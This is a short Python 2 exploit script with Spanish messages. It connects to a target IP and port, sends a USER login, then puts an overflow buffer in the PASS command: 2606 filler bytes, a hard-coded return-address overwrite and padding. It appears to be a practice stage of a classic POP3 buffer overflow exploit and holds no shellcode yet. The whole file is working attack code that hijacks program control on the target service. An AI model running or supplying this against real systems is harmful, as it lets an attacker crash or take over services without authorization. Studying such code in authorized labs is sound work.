#!/usr/bin/python
# coding: utf-8

import socket, signal, signal, time, pdb, pwn
from pwn import *

def def_handler(sig, frame):
    print "\n\n [¡] Saliendo...\n"
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)



if len(sys.argv) <3:
  print "\n [¡]Uso: python " + sys.argv[0] + " <dirección-ip><puerto>\n"
  sys.exit(1)


ipAddress = sys.argv[1]
port = sys.argv[2]

if __name__ == '__main__':

    offset = "A" * 2606
    junk = "C" * (3500-2606-4)

    buffer = offset + "\x8f\x35\x4a\x5f" + junk
    #buffer = offset + "\x03\x97\x4b\x5f" +junk
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ipAddress, int(port)))
        data = s.recv(1024)
        s.send ("USER jam620\r\n")
        data = s.recv(1024)

        s.send("PASS %s\r\n" % buffer)

        data = s.recv(1024)

        s.close()

    except:
        print "\n[!] Error de conexión...\n"
        sys.exit(1)
